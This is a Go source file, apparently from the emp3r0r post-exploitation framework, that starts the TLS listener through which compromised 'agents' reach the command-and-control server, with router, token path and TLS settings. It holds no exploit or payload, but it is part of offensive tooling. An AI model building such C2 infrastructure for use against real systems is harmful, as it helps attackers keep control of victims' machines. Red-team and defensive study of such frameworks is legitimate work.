package server

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// StartC2AgentTLSServer starts the TLS server.
func StartC2AgentTLSServer() {
	if _, err := os.Stat(live.Temp + transport.WWW); os.IsNotExist(err) {
		err = os.MkdirAll(live.Temp+transport.WWW, 0o700)
		if err != nil {
			logging.Fatalf("StartTLSServer: %v", err)
		}
	}
	r := mux.NewRouter()
	transport.CACrtPEM = []byte(live.RuntimeConfig.CAPEM)
	r.HandleFunc(fmt.Sprintf("/%s/{api}/{token}", transport.WebRoot), apiDispatcher)
	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
	}
	network.EmpTLSServer = &http.Server{
		Addr:    fmt.Sprintf(":%s", live.RuntimeConfig.CCPort),
		Handler: r,
		TLSConfig: &tls.Config{
			CurvePreferences: []tls.CurveID{
				tls.CurveP256,
				tls.X25519,
			},
			MinVersion: tls.VersionTLS12,
		},
	}
	network.EmpTLSServerCtx, network.EmpTLSServerCancel = context.WithCancel(context.Background())
	logging.Successf("🚀 Starting C2 agent listener service with TLS at port %s", live.RuntimeConfig.CCPort)
	err := network.EmpTLSServer.ListenAndServeTLS(transport.ServerCrtFile, transport.ServerKeyFile)
	if err != nil {
		if err == http.ErrServerClosed {
			logging.Warningf("C2 TLS service is shutdown")
			return
		}
		logging.Fatalf("Failed to start HTTPS server at *:%s: %v", live.RuntimeConfig.CCPort, err)
	}
}
